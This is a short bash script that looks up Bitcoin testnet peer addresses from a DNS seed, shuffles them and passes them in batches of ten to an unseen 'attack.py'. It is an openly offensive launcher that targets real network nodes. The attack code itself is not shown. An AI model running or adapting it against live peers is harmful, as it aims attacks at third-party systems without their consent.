#/usr/bin/bash
(for seed in "testnet-seed.bitcoin.petertodd.org"
do
    host -t A $seed | sed 's/.*address //g'
done) | sort -R | xargs -n 10 python attack.py
